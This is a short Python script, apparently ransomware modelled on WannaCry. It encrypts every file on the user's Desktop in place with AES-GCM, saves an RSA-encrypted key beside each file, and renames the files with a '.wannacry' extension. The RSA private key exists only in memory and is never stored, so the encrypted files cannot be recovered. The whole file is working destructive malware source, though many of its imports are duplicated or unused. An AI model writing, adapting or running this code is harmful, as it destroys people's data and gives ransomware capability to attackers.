import os
import glob
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.kdf.concatkdf import ConcatKDFHash
from cryptography.hazmat.primitives.kdf.concatkdf import ConcatKDFHMAC
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.concatkdf import ConcatKDFHMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from cryptography.exceptions import InvalidSignature
import os
import glob
import random
import string

# Generate RSA keys
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Function to generate a random AES key
def generate_aes_key(length=32):
    return os.urandom(length)

# Function to encrypt a file using AES
def aes_encrypt(file_path, aes_key):
    with open(file_path, 'rb') as f:
        data = f.read()
    nonce = os.urandom(12)
    aesgcm = AESGCM(aes_key)
    encrypted_data = aesgcm.encrypt(nonce, data, None)
    with open(file_path, 'wb') as f:
        f.write(nonce + encrypted_data)

# Function to encrypt the AES key using RSA
def rsa_encrypt(aes_key, public_key):
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted_key

# Function to change the file extension to .wannacry
def change_extension(file_path):
    base = os.path.splitext(file_path)[0]
    new_path = base + '.wannacry'
    os.rename(file_path, new_path)

# Function to process files in the directory
def process_files(directory):
    for filepath in glob.glob(os.path.join(directory, '*')):
        if os.path.isfile(filepath):
            aes_key = generate_aes_key()
            aes_encrypt(filepath, aes_key)
            encrypted_key = rsa_encrypt(aes_key, public_key)
            with open(filepath + '.key', 'wb') as key_file:
                key_file.write(encrypted_key)
            change_extension(filepath)

if __name__ == "__main__":
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    process_files(desktop_path)
